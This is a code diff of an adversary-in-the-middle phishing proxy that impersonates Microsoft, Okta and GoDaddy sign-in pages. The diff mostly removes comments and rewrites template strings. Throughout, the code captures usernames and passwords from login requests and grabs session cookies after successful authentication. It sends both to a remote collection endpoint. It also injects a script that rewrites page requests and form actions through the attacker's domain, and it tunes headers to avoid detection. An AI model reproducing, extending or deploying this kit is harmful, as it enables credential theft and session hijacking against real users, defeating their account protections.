@@ -48,7 +48,6 @@ const CRITICAL_AUTH_COOKIES = {
   godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
 };
 
-// NEW: Define post-login URL patterns to detect successful authentication
 const POST_LOGIN_PATTERNS = {
   microsoft: [
     '/common/oauth2/authorize',
@@ -105,9 +104,9 @@ async function sendToVercel(type, data) {
 async function exfiltrateCookies(cookieText, ip, platform, url) {
   try {
     const cleanUrl = url.split('?')[0];
-    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\nData: Cookies found:\n\n${cookieText}\n`;
+    const content = 'IP: ' + ip + '\nPlatform: ' + platform + '\nURL: ' + cleanUrl + '\nData: Cookies found:\n\n' + cookieText + '\n';
     const formData = new FormData();
-    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
+    formData.append("file", new Blob([content], { type: "text/plain" }), ip + '-' + platform + '-COOKIE.txt');
     formData.append("ip", ip);
     formData.append("type", "cookie-file");
 
@@ -211,21 +210,17 @@ function hasCriticalAuthCookies(cookieString, platform) {
   });
 }
 
-// NEW: Check if current request is a post-login/auth endpoint
 function isPostLoginEndpoint(path, platform) {
   const patterns = POST_LOGIN_PATTERNS[platform] || [];
   return patterns.some(pattern => path.toLowerCase().includes(pattern.toLowerCase()));
 }
 
-// NEW: Check if response indicates successful login (redirect to app/success)
 function isSuccessfulAuthRedirect(status, location, platform) {
   if (![301, 302, 303, 307, 308].includes(status)) return false;
   if (!location) return false;
 
-  // Check if redirecting to application (not back to login)
   const lowerLoc = location.toLowerCase();
 
-  // Microsoft: redirect to app or code/token
   if (platform === 'microsoft') {
     return lowerLoc.includes('code=') || 
            lowerLoc.includes('access_token=') || 
@@ -235,7 +230,6 @@ function isSuccessfulAuthRedirect(status, location, platform) {
             !lowerLoc.includes('reprocess'));
   }
 
-  // Okta: redirect to app or session established
   if (platform === 'okta') {
     return lowerLoc.includes('sessionToken') || 
            lowerLoc.includes('fromURI') ||
@@ -243,7 +237,6 @@ function isSuccessfulAuthRedirect(status, location, platform) {
             !lowerLoc.includes('okta.com/auth'));
   }
 
-  // GoDaddy: redirect to dashboard/app
   if (platform === 'godaddy') {
     return lowerLoc.includes('account') || 
            lowerLoc.includes('dashboard') ||
@@ -252,7 +245,6 @@ function isSuccessfulAuthRedirect(status, location, platform) {
             !lowerLoc.includes('authenticate'));
   }
 
-  // Generic: redirect away from auth domain
   return !shouldProxyDomain(new URL(location).hostname);
 }
 
@@ -271,9 +263,7 @@ function parseCredentials(bodyText) {
       pass = jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass;
     }
     if (user && pass) return { user, pass };
-  } catch (e) {
-    // Not JSON, try form-urlencoded
-  }
+  } catch (e) {}
 
   const keyValuePairs = bodyText.split('&');
   for (const pair of keyValuePairs) {
@@ -299,317 +289,7 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
   const baseSegment = pathSegments.length > 0 ? pathSegments[0] : '';
   const basePath = baseSegment ? '/' + baseSegment + '/' : '/';
 
-  return `
-<script>
-(function() {
-  'use strict';
-
-  try {
-    const PROXY_PREFIX = '${PROXY_PREFIX}';
-    const YOUR_DOMAIN = '${YOUR_DOMAIN}';
-    const CURRENT_UPSTREAM = '${upstreamDomain}';
-    const CURRENT_BASE_PATH = '${basePath}';
-
-    console.log('[Proxy Interceptor] Initializing for upstream:', CURRENT_UPSTREAM, 'Base path:', CURRENT_BASE_PATH);
-
-    function shouldProxyDomain(hostname) {
-      if (!hostname) return false;
-      const domains = [
-        'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',
-        'office.com', 'microsoft365.com', 'outlook.office.com', 'outlook.live.com',
-        'godaddy.com', 'secureserver.net', 'csp.secureserver.net', 
-        'sso.godaddy.com', 'sso.secureserver.net', 'api.godaddy.com',
-        'okta.com', 'onelogin.com', 'duosecurity.com',
-        'wsimg.com', 'img1.wsimg.com', 'img2.wsimg.com', 'img3.wsimg.com',
-        'img4.wsimg.com', 'img5.wsimg.com', 'img6.wsimg.com',
-        'gui.godaddy.com', 'www.godaddy.com'
-      ];
-      return domains.some(d => hostname.includes(d));
-    }
-
-    function rewriteUrl(url) {
-      if (!url || typeof url !== 'string') return url;
-      try {
-        if (url.includes(YOUR_DOMAIN + PROXY_PREFIX)) return url;
-        if (url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('javascript:')) return url;
-        if (url.startsWith('#')) return url;
-
-        if (url.startsWith('http://') || url.startsWith('https://')) {
-          try {
-            const urlObj = new URL(url);
-            if (shouldProxyDomain(urlObj.hostname)) {
-              return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search + urlObj.hash;
-            }
-          } catch(e) {}
-          return url;
-        }
-
-        if (url.startsWith('//')) {
-          const hostname = url.split('/')[2];
-          if (shouldProxyDomain(hostname)) {
-            return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + hostname + url.substring(2 + hostname.length);
-          }
-          return 'https:' + url;
-        }
-
-        if (url.startsWith('/')) {
-          const cleanPath = url.substring(1);
-          if (cleanPath.startsWith('_p/')) return url;
-          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + '/' + cleanPath;
-        }
-
-        if (!url.startsWith('/') && !url.startsWith('http')) {
-          const currentDir = CURRENT_BASE_PATH;
-          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + currentDir + url;
-        }
-
-      } catch(e) {
-        console.error('[Proxy Interceptor] Error rewriting URL:', url, e);
-      }
-      return url;
-    }
-
-    const originalImageSrc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
-    Object.defineProperty(HTMLImageElement.prototype, 'src', {
-      get: function() {
-        return originalImageSrc.get.call(this);
-      },
-      set: function(value) {
-        const newSrc = rewriteUrl(value);
-        if (newSrc !== value) {
-          console.log('[Proxy Interceptor] Rewrote Image.src:', value, '->', newSrc);
-        }
-        originalImageSrc.set.call(this, newSrc);
-      }
-    });
-
-    if ('srcset' in HTMLImageElement.prototype) {
-      const originalSrcset = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'srcset') 
-        || { get: function() { return this.getAttribute('srcset'); }, set: function(v) { this.setAttribute('srcset', v); }};
-
-      Object.defineProperty(HTMLImageElement.prototype, 'srcset', {
-        get: function() { return originalSrcset.get.call(this); },
-        set: function(value) {
-          if (!value) {
-            originalSrcset.set.call(this, value);
-            return;
-          }
-          const urls = value.split(',').map(part => {
-            const trimmed = part.trim();
-            const spaceIdx = trimmed.search(/\\s/);
-            let url, descriptor;
-            if (spaceIdx === -1) {
-              url = trimmed;
-              descriptor = '';
-            } else {
-              url = trimmed.slice(0, spaceIdx);
-              descriptor = trimmed.slice(spaceIdx);
-            }
-            const newUrl = rewriteUrl(url);
-            return newUrl + descriptor;
-          });
-          const newValue = urls.join(', ');
-          if (newValue !== value) {
-            console.log('[Proxy Interceptor] Rewrote srcset:', value, '->', newValue);
-          }
-          originalSrcset.set.call(this, newValue);
-        }
-      });
-    }
-
-    const originalFetch = window.fetch;
-    window.fetch = function(url, options) {
-      try {
-        let rewrittenUrl = url;
-        if (typeof url === 'string') {
-          rewrittenUrl = rewriteUrl(url);
-          if (rewrittenUrl !== url) {
-            console.log('[Proxy Interceptor] Rewrote fetch:', url, '->', rewrittenUrl);
-          }
-        } else if (url instanceof Request) {
-          const newUrl = rewriteUrl(url.url);
-          if (newUrl !== url.url) {
-            rewrittenUrl = new Request(newUrl, url);
-            console.log('[Proxy Interceptor] Rewrote Request:', url.url, '->', newUrl);
-          }
-        }
-        return originalFetch.call(this, rewrittenUrl, options);
-      } catch(e) {
-        return originalFetch.call(this, url, options);
-      }
-    };
-
-    const originalOpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
-      try {
-        const rewrittenUrl = rewriteUrl(url);
-        if (rewrittenUrl !== url) {
-          console.log('[Proxy Interceptor] Rewrote XHR:', url, '->', rewrittenUrl);
-        }
-        return originalOpen.call(this, method, rewrittenUrl, async, user, password);
-      } catch(e) {
-        return originalOpen.call(this, method, url, async, user, password);
-      }
-    };
-
-    if (window.WebSocket) {
-      const originalWebSocket = window.WebSocket;
-      window.WebSocket = function(url, protocols) {
-        try {
-          const rewrittenUrl = rewriteUrl(url);
-          if (rewrittenUrl !== url) {
-            console.log('[Proxy Interceptor] Rewrote WebSocket:', url, '->', rewrittenUrl);
-          }
-          return new originalWebSocket(rewrittenUrl, protocols);
-        } catch(e) {
-          return new originalWebSocket(url, protocols);
-        }
-      };
-    }
-
-    if ('serviceWorker' in navigator) {
-      const fakeRegistration = {
-        active: null,
-        installing: null,
-        waiting: null,
-        scope: '/',
-        update: function() { return Promise.resolve(this); },
-        unregister: function() { return Promise.resolve(true); }
-      };
-
-      navigator.serviceWorker.register = function(scriptURL, options) {
-        console.log('[Proxy Interceptor] Blocking service worker:', scriptURL);
-        return Promise.resolve(fakeRegistration);
-      };
-    }
-
-    if (typeof MutationObserver !== 'undefined') {
-      const observer = new MutationObserver(function(mutations) {
-        mutations.forEach(function(mutation) {
-          if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
-            const node = mutation.target;
-            if (node.style && node.style.backgroundImage) {
-              const current = node.style.backgroundImage;
-              const newBg = current.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
-                if (url.startsWith('http') || url.startsWith('/')) {
-                  const newUrl = rewriteUrl(url);
-                  if (newUrl !== url) return 'url(' + newUrl + ')';
-                }
-                return match;
-              });
-              if (newBg !== current) {
-                node.style.backgroundImage = newBg;
-                console.log('[Proxy Interceptor] Rewrote backgroundImage:', current, '->', newBg);
-              }
-            }
-          }
-
-          mutation.addedNodes.forEach(function(node) {
-            if (node.nodeType === 1) {
-              try {
-                if (node.src && !node.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
-                  const newSrc = rewriteUrl(node.src);
-                  if (newSrc !== node.src) {
-                    node.src = newSrc;
-                    console.log('[Proxy Interceptor] Rewrote node src:', newSrc);
-                  }
-                }
-
-                if (node.href && !node.href.includes(YOUR_DOMAIN + PROXY_PREFIX) && !node.href.startsWith('#')) {
-                  const newHref = rewriteUrl(node.href);
-                  if (newHref !== node.href) {
-                    node.href = newHref;
-                    console.log('[Proxy Interceptor] Rewrote node href:', newHref);
-                  }
-                }
-
-                if (node.style && node.style.cssText) {
-                  const newCss = node.style.cssText.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
-                    const newUrl = rewriteUrl(url);
-                    if (newUrl !== url) return 'url(' + newUrl + ')';
-                    return match;
-                  });
-                  if (newCss !== node.style.cssText) {
-                    node.style.cssText = newCss;
-                  }
-                }
-
-                if (node.querySelectorAll) {
-                  node.querySelectorAll('[src],[href],[style]').forEach(function(el) {
-                    if (el.src && !el.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
-                      const newSrc = rewriteUrl(el.src);
-                      if (newSrc !== el.src) el.src = newSrc;
-                    }
-                    if (el.href && !el.href.includes(YOUR_DOMAIN + PROXY_PREFIX) && !el.href.startsWith('#')) {
-                      const newHref = rewriteUrl(el.href);
-                      if (newHref !== el.href) el.href = newHref;
-                    }
-                    if (el.style && el.style.cssText) {
-                      el.style.cssText = el.style.cssText.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
-                        const newUrl = rewriteUrl(url);
-                        return newUrl !== url ? 'url(' + newUrl + ')' : match;
-                      });
-                    }
-                  });
-                }
-              } catch(e) {}
-            }
-          });
-        });
-      });
-
-      if (document.body) {
-        observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'src', 'href'] });
-      } else {
-        document.addEventListener('DOMContentLoaded', function() {
-          if (document.body) observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'src', 'href'] });
-        });
-      }
-    }
-
-    const originalSetProperty = CSSStyleDeclaration.prototype.setProperty;
-    CSSStyleDeclaration.prototype.setProperty = function(property, value, priority) {
-      if (property && property.toLowerCase().includes('background') && value && value.includes('url(')) {
-        value = value.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
-          const newUrl = rewriteUrl(url);
-          if (newUrl !== url) return 'url(' + newUrl + ')';
-          return match;
-        });
-      }
-      return originalSetProperty.call(this, property, value, priority);
-    };
-
-    if (CSSStyleSheet && CSSStyleSheet.prototype.insertRule) {
-      const originalInsertRule = CSSStyleSheet.prototype.insertRule;
-      CSSStyleSheet.prototype.insertRule = function(rule, index) {
-        const newRule = rule.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
-          const newUrl = rewriteUrl(url);
-          return newUrl !== url ? 'url(' + newUrl + ')' : match;
-        });
-        return originalInsertRule.call(this, newRule, index);
-      };
-    }
-
-    document.addEventListener('submit', function(e) {
-      const form = e.target;
-      if (form.action && !form.action.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
-        try {
-          const actionUrl = new URL(form.action);
-          if (shouldProxyDomain(actionUrl.hostname)) {
-            const newAction = rewriteUrl(form.action);
-            form.action = newAction;
-            console.log('[Proxy Interceptor] Rewrote form action to:', newAction);
-          }
-        } catch(err) {}
-      }
-    }, true);
-
-    console.log('[Proxy Interceptor] Successfully initialized for upstream:', CURRENT_UPSTREAM);
-  } catch(err) {
-    console.error('[Proxy Interceptor] Failed to initialize:', err);
-  }
-})();
-</script>`;
+  return "\n<script>\n(function() {\n  'use strict';\n\n  try {\n    const PROXY_PREFIX = '" + PROXY_PREFIX + "';\n    const YOUR_DOMAIN = '" + YOUR_DOMAIN + "';\n    const CURRENT_UPSTREAM = '" + upstreamDomain + "';\n    const CURRENT_BASE_PATH = '" + basePath + "';\n\n    console.log('[Proxy Interceptor] Initializing for upstream:', CURRENT_UPSTREAM, 'Base path:', CURRENT_BASE_PATH);\n\n    function shouldProxyDomain(hostname) {\n      if (!hostname) return false;\n      const domains = [\n        'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',\n        'office.com', 'microsoft365.com', 'outlook.office.com', 'outlook.live.com',\n        'godaddy.com', 'secureserver.net', 'csp.secureserver.net', \n        'sso.godaddy.com', 'sso.secureserver.net', 'api.godaddy.com',\n        'okta.com', 'onelogin.com', 'duosecurity.com',\n        'wsimg.com', 'img1.wsimg.com', 'img2.wsimg.com', 'img3.wsimg.com',\n        'img4.wsimg.com', 'img5.wsimg.com', 'img6.wsimg.com',\n        'gui.godaddy.com', 'www.godaddy.com'\n      ];\n      return domains.some(d => hostname.includes(d));\n    }\n\n    function rewriteUrl(url) {\n      if (!url || typeof url !== 'string') return url;\n      try {\n        if (url.includes(YOUR_DOMAIN + PROXY_PREFIX)) return url;\n        if (url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('javascript:')) return url;\n        if (url.startsWith('#')) return url;\n\n        if (url.startsWith('http://') || url.startsWith('https://')) {\n          try {\n            const urlObj = new URL(url);\n            if (shouldProxyDomain(urlObj.hostname)) {\n              return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search + urlObj.hash;\n            }\n          } catch(e) {}\n          return url;\n        }\n\n        if (url.startsWith('//')) {\n          const hostname = url.split('/')[2];\n          if (shouldProxyDomain(hostname)) {\n            return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + hostname + url.substring(2 + hostname.length);\n          }\n          return 'https:' + url;\n        }\n\n        if (url.startsWith('/')) {\n          const cleanPath = url.substring(1);\n          if (cleanPath.startsWith('_p/')) return url;\n          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + '/' + cleanPath;\n        }\n\n        if (!url.startsWith('/') && !url.startsWith('http')) {\n          const currentDir = CURRENT_BASE_PATH;\n          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + currentDir + url;\n        }\n\n      } catch(e) {\n        console.error('[Proxy Interceptor] Error rewriting URL:', url, e);\n      }\n      return url;\n    }\n\n    const originalImageSrc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');\n    Object.defineProperty(HTMLImageElement.prototype, 'src', {\n      get: function() {\n        return originalImageSrc.get.call(this);\n      },\n      set: function(value) {\n        const newSrc = rewriteUrl(value);\n        if (newSrc !== value) {\n          console.log('[Proxy Interceptor] Rewrote Image.src:', value, '->', newSrc);\n        }\n        originalImageSrc.set.call(this, newSrc);\n      }\n    });\n\n    if ('srcset' in HTMLImageElement.prototype) {\n      const originalSrcset = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'srcset') \n        || { get: function() { return this.getAttribute('srcset'); }, set: function(v) { this.setAttribute('srcset', v); }};\n\n      Object.defineProperty(HTMLImageElement.prototype, 'srcset', {\n        get: function() { return originalSrcset.get.call(this); },\n        set: function(value) {\n          if (!value) {\n            originalSrcset.set.call(this, value);\n            return;\n          }\n          const urls = value.split(',').map(part => {\n            const trimmed = part.trim();\n            const spaceIdx = trimmed.search(/\\s/);\n            let url, descriptor;\n            if (spaceIdx === -1) {\n              url = trimmed;\n              descriptor = '';\n            } else {\n              url = trimmed.slice(0, spaceIdx);\n              descriptor = trimmed.slice(spaceIdx);\n            }\n            const newUrl = rewriteUrl(url);\n            return newUrl + descriptor;\n          });\n          const newValue = urls.join(', ');\n          if (newValue !== value) {\n            console.log('[Proxy Interceptor] Rewrote srcset:', value, '->', newValue);\n          }\n          originalSrcset.set.call(this, newValue);\n        }\n      });\n    }\n\n    const originalFetch = window.fetch;\n    window.fetch = function(url, options) {\n      try {\n        let rewrittenUrl = url;\n        if (typeof url === 'string') {\n          rewrittenUrl = rewriteUrl(url);\n          if (rewrittenUrl !== url) {\n            console.log('[Proxy Interceptor] Rewrote fetch:', url, '->', rewrittenUrl);\n          }\n        } else if (url instanceof Request) {\n          const newUrl = rewriteUrl(url.url);\n          if (newUrl !== url.url) {\n            rewrittenUrl = new Request(newUrl, url);\n            console.log('[Proxy Interceptor] Rewrote Request:', url.url, '->', newUrl);\n          }\n        }\n        return originalFetch.call(this, rewrittenUrl, options);\n      } catch(e) {\n        return originalFetch.call(this, url, options);\n      }\n    };\n\n    const originalOpen = XMLHttpRequest.prototype.open;\n    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {\n      try {\n        const rewrittenUrl = rewriteUrl(url);\n        if (rewrittenUrl !== url) {\n          console.log('[Proxy Interceptor] Rewrote XHR:', url, '->', rewrittenUrl);\n        }\n        return originalOpen.call(this, method, rewrittenUrl, async, user, password);\n      } catch(e) {\n        return originalOpen.call(this, method, url, async, user, password);\n      }\n    };\n\n    if (window.WebSocket) {\n      const originalWebSocket = window.WebSocket;\n      window.WebSocket = function(url, protocols) {\n        try {\n          const rewrittenUrl = rewriteUrl(url);\n          if (rewrittenUrl !== url) {\n            console.log('[Proxy Interceptor] Rewrote WebSocket:', url, '->', rewrittenUrl);\n          }\n          return new originalWebSocket(rewrittenUrl, protocols);\n        } catch(e) {\n          return new originalWebSocket(url, protocols);\n        }\n      };\n    }\n\n    if ('serviceWorker' in navigator) {\n      const fakeRegistration = {\n        active: null,\n        installing: null,\n        waiting: null,\n        scope: '/',\n        update: function() { return Promise.resolve(this); },\n        unregister: function() { return Promise.resolve(true); }\n      };\n\n      navigator.serviceWorker.register = function(scriptURL, options) {\n        console.log('[Proxy Interceptor] Blocking service worker:', scriptURL);\n        return Promise.resolve(fakeRegistration);\n      };\n    }\n\n    if (typeof MutationObserver !== 'undefined') {\n      const observer = new MutationObserver(function(mutations) {\n        mutations.forEach(function(mutation) {\n          if (mutation.type === 'attributes' && mutation.attributeName === 'style') {\n            const node = mutation.target;\n            if (node.style && node.style.backgroundImage) {\n              const current = node.style.backgroundImage;\n              const newBg = current.replace(/url\\([\"']?([^\"')]+)[\"']?\\)/g, (match, url) => {\n                if (url.startsWith('http') || url.startsWith('/')) {\n                  const newUrl = rewriteUrl(url);\n                  if (newUrl !== url) return 'url(' + newUrl + ')';\n                }\n                return match;\n              });\n              if (newBg !== current) {\n                node.style.backgroundImage = newBg;\n                console.log('[Proxy Interceptor] Rewrote backgroundImage:', current, '->', newBg);\n              }\n            }\n          }\n\n          mutation.addedNodes.forEach(function(node) {\n            if (node.nodeType === 1) {\n              try {\n                if (node.src && !node.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {\n                  const newSrc = rewriteUrl(node.src);\n                  if (newSrc !== node.src) {\n                    node.src = newSrc;\n                    console.log('[Proxy Interceptor] Rewrote node src:', newSrc);\n                  }\n                }\n\n                if (node.href && !node.href.includes(YOUR_DOMAIN + PROXY_PREFIX) && !node.href.startsWith('#')) {\n                  const newHref = rewriteUrl(node.href);\n                  if (newHref !== node.href) {\n                    node.href = newHref;\n                    console.log('[Proxy Interceptor] Rewrote node href:', newHref);\n                  }\n                }\n\n                if (node.style && node.style.cssText) {\n                  const newCss = node.style.cssText.replace(/url\\([\"']?([^\"')]+)[\"']?\\)/g, (match, url) => {\n                    const newUrl = rewriteUrl(url);\n                    if (newUrl !== url) return 'url(' + newUrl + ')';\n                    return match;\n                  });\n                  if (newCss !== node.style.cssText) {\n                    node.style.cssText = newCss;\n                  }\n                }\n\n                if (node.querySelectorAll) {\n                  node.querySelectorAll('[src],[href],[style]').forEach(function(el) {\n                    if (el.src && !el.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {\n                      const newSrc = rewriteUrl(el.src);\n                      if (newSrc !== el.src) el.src = newSrc;\n                    }\n                    if (el.href && !el.href.includes(YOUR_DOMAIN + PROXY_PREFIX) && !el.href.startsWith('#')) {\n                      const newHref = rewriteUrl(el.href);\n                      if (newHref !== el.href) el.href = newHref;\n                    }\n                    if (el.style && el.style.cssText) {\n                      el.style.cssText = el.style.cssText.replace(/url\\([\"']?([^\"')]+)[\"']?\\)/g, (match, url) => {\n                        const newUrl = rewriteUrl(url);\n                        return newUrl !== url ? 'url(' + newUrl + ')' : match;\n                      });\n                    }\n                  });\n                }\n              } catch(e) {}\n            }\n          });\n        });\n      });\n\n      if (document.body) {\n        observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'src', 'href'] });\n      } else {\n        document.addEventListener('DOMContentLoaded', function() {\n          if (document.body) observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'src', 'href'] });\n        });\n      }\n    }\n\n    const originalSetProperty = CSSStyleDeclaration.prototype.setProperty;\n    CSSStyleDeclaration.prototype.setProperty = function(property, value, priority) {\n      if (property && property.toLowerCase().includes('background') && value && value.includes('url(')) {\n        value = value.replace(/url\\([\"']?([^\"')]+)[\"']?\\)/g, (match, url) => {\n          const newUrl = rewriteUrl(url);\n          if (newUrl !== url) return 'url(' + newUrl + ')';\n          return match;\n        });\n      }\n      return originalSetProperty.call(this, property, value, priority);\n    };\n\n    if (CSSStyleSheet && CSSStyleSheet.prototype.insertRule) {\n      const originalInsertRule = CSSStyleSheet.prototype.insertRule;\n      CSSStyleSheet.prototype.insertRule = function(rule, index) {\n        const newRule = rule.replace(/url\\([\"']?([^\"')]+)[\"']?\\)/g, (match, url) => {\n          const newUrl = rewriteUrl(url);\n          return newUrl !== url ? 'url(' + newUrl + ')' : match;\n        });\n        return originalInsertRule.call(this, newRule, index);\n      };\n    }\n\n    document.addEventListener('submit', function(e) {\n      const form = e.target;\n      if (form.action && !form.action.includes(YOUR_DOMAIN + PROXY_PREFIX)) {\n        try {\n          const actionUrl = new URL(form.action);\n          if (shouldProxyDomain(actionUrl.hostname)) {\n            const newAction = rewriteUrl(form.action);\n            form.action = newAction;\n            console.log('[Proxy Interceptor] Rewrote form action to:', newAction);\n          }\n        } catch(err) {}\n      }\n    }, true);\n\n    console.log('[Proxy Interceptor] Successfully initialized for upstream:', CURRENT_UPSTREAM);\n  } catch(err) {\n    console.error('[Proxy Interceptor] Failed to initialize:', err);\n  }\n})();\n</script>";
 }
 
 export default async function handleRequest(request) {
@@ -624,10 +304,10 @@ export default async function handleRequest(request) {
   const upstreamDomain = info.upstream;
   const cleanSearch = cleanQueryString(url.search);
   const upstreamPath = info.path + cleanSearch;
-  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
-  const displayUrl = `https://${YOUR_DOMAIN}${url.pathname}`;
+  const upstreamUrl = 'https://' + upstreamDomain + upstreamPath;
+  const displayUrl = 'https://' + YOUR_DOMAIN + url.pathname;
 
-  console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);
+  console.log('[' + info.type + '] ' + request.method + ' ' + displayUrl + ' -> ' + upstreamUrl);
 
   if (request.method === 'OPTIONS') {
     return new Response(null, {
@@ -642,10 +322,8 @@ export default async function handleRequest(request) {
     });
   }
 
-  // CRITICAL FIX: Build headers carefully to avoid detection
   const headers = new Headers();
 
-  // Copy important headers from original request
   const originalUA = request.headers.get('user-agent');
   const originalAccept = request.headers.get('accept');
   const originalAcceptLang = request.headers.get('accept-language');
@@ -653,30 +331,25 @@ export default async function handleRequest(request) {
   const originalCookie = request.headers.get('cookie');
   const originalContentType = request.headers.get('content-type');
 
-  // Set required headers - use original UA if available, else generic Chrome
   headers.set('User-Agent', originalUA || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
   headers.set('Accept', originalAccept || 'application/json, text/plain, */*');
   headers.set('Accept-Language', originalAcceptLang || 'en-US,en;q=0.9');
   headers.set('Accept-Encoding', originalAcceptEnc || 'gzip, deflate, br');
   headers.set('Host', upstreamDomain);
-  headers.set('Referer', `https://${upstreamDomain}/`);
-  headers.set('Origin', `https://${upstreamDomain}`);
+  headers.set('Referer', 'https://' + upstreamDomain + '/');
+  headers.set('Origin', 'https://' + upstreamDomain);
 
-  // Only set Content-Type if present in original
   if (originalContentType) {
     headers.set('Content-Type', originalContentType);
   }
 
-  // Copy cookies if present (important for session continuity)
   if (originalCookie) {
     headers.set('Cookie', originalCookie);
   }
 
-  // Copy X-Requested-With if present (indicates AJAX)
   const xrw = request.headers.get('x-requested-with');
   if (xrw) headers.set('X-Requested-With', xrw);
 
-  // Remove problematic headers that cause issues
   headers.delete('expect');
   headers.delete('connection');
   headers.delete('keep-alive');
@@ -685,7 +358,7 @@ export default async function handleRequest(request) {
   headers.delete('x-forwarded-host');
   headers.delete('x-forwarded-proto');
   headers.delete('x-forwarded-for');
-  headers.delete('content-length'); // Will calculate exactly
+  headers.delete('content-length');
 
   let bodyText = null;
   let requestBodyForUpstream = null;
@@ -700,7 +373,7 @@ export default async function handleRequest(request) {
       const { user, pass } = parseCredentials(bodyText);
 
       if (user && pass) {
-        console.log(`[CREDENTIALS CAPTURED] User: ${user.substring(0, 5)}... Platform: ${info.type}`);
+        console.log('[CREDENTIALS CAPTURED] User: ' + user.substring(0, 5) + '... Platform: ' + info.type);
 
         await sendToVercel('credentials', {
           type: "creds",
@@ -711,9 +384,9 @@ export default async function handleRequest(request) {
           url: displayUrl
         });
 
-        const content = `IP: ${ip}\nPlatform: ${info.type}\nUser: ${user}\nPass: ${pass}\nURL: ${displayUrl}\n`;
+        const content = 'IP: ' + ip + '\nPlatform: ' + info.type + '\nUser: ' + user + '\nPass: ' + pass + '\nURL: ' + displayUrl + '\n';
         const formData = new FormData();
-        formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
+        formData.append("file", new Blob([content], { type: "text/plain" }), ip + '-CREDENTIALS.txt');
         formData.append("ip", ip);
         formData.append("type", "credentials");
 
@@ -749,17 +422,16 @@ export default async function handleRequest(request) {
       }
     }
 
-    console.log(`[DEBUG] Fetching upstream: ${upstreamUrl}`);
-    console.log(`[DEBUG] Method: ${request.method}`);
-    console.log(`[DEBUG] Has body: ${!!fetchOpts.body}`);
-    console.log(`[DEBUG] Content-Type: ${headers.get('content-type')}`);
-    console.log(`[DEBUG] Content-Length: ${headers.get('content-length')}`);
+    console.log('[DEBUG] Fetching upstream: ' + upstreamUrl);
+    console.log('[DEBUG] Method: ' + request.method);
+    console.log('[DEBUG] Has body: ' + !!fetchOpts.body);
+    console.log('[DEBUG] Content-Type: ' + headers.get('content-type'));
+    console.log('[DEBUG] Content-Length: ' + headers.get('content-length'));
 
     const resp = await fetch(upstreamUrl, fetchOpts);
 
-    console.log(`[DEBUG] Upstream response status: ${resp.status}`);
+    console.log('[DEBUG] Upstream response status: ' + resp.status);
 
-    // Check for successful auth redirect
     const location = resp.headers.get('Location');
     const isAuthSuccess = isSuccessfulAuthRedirect(resp.status, location, info.type);
 
@@ -768,7 +440,7 @@ export default async function handleRequest(request) {
         const newHeaders = new Headers(resp.headers);
         const newLoc = rewriteLocation(location);
 
-        console.log(`[Redirect] ${location} -> ${newLoc}`);
+        console.log('[Redirect] ' + location + ' -> ' + newLoc);
 
         newHeaders.set('Location', newLoc);
         return new Response(null, { status: resp.status, headers: newHeaders });
@@ -787,10 +459,6 @@ export default async function handleRequest(request) {
 
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
 
-    // UPDATED: Only capture cookies if:
-    // 1. It's a POST to a post-login endpoint, OR
-    // 2. Response indicates successful auth (redirect with tokens/codes), OR  
-    // 3. Response contains critical auth cookies AND is a successful auth redirect
     let shouldCaptureCookies = false;
     let cookieStr = '';
 
@@ -799,11 +467,10 @@ export default async function handleRequest(request) {
       const hasAuthCookies = hasCriticalAuthCookies(cookieStr, info.type);
       const isPostLogin = request.method === 'POST' && isPostLoginEndpoint(info.path, info.type);
 
-      // Only capture if we're in a post-login flow or successful auth
       shouldCaptureCookies = isPostLogin || (isAuthSuccess && hasAuthCookies);
 
